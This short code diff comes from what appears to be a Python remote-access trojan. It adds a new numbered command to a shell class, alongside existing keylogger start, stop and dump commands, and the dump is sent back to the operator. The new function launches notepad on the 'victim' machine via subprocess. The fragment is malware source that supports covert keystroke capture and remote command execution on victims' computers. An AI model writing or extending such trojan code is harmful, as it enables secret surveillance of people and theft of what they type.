@@ -40,6 +40,7 @@ class Shell(object):
           12: self.logger_start,
           13: self.logger_stop,
           14: self.logger_dump,
+          15: self.notepad, 
         }
 
         self.tasks = {
@@ -174,7 +175,13 @@ class Shell(object):
     def logger_stop(self, args):
         if self.keylogger:
             self.keylogger.stop()
+            
+    def notepad(self, args): #New TODO
+        print('Opening victims notepad')
+        cmd = 'start notepad.exe'
+        subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
+    
     def logger_dump(self, args):
         if self.keylogger:
             self.send(-0, self.keylogger.dump())
